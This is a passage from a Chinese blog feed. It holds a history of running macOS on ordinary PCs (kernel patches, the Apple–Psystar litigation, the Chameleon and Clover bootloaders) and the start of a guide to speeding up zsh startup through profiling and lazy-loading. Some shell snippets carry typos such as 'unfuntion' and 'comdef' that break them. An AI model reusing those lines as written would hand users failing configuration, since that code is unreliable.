上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 